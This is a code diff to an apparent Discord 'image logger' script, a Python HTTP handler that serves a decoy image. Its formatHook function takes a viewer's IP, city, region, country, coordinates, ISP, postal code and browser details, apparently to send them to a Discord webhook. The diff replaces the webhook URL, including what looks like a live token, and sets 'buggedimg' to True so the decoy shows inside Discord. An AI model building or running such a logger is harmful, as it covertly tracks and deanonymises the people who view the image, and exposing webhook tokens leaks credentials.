@@ -2,10 +2,10 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-'
+webhook = 'https://discordapp.com/api/webhooks/1382046054488342708/QysCxH7f8sSr5MdjgPtbzq6RpHQLsJ5K_YyFIGC-aHFvewF0ZCn6bo4R6OiX1kr8_gU2-'
 
 bindata = httpx.get('https://m.media-amazon.com/images/M/MV5BMTQyODM3OTY1OV5BMl5BanBnXkFtZTcwNDg1MDIzOQ@@._V1_.jpg').content
-buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
+buggedimg = True # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
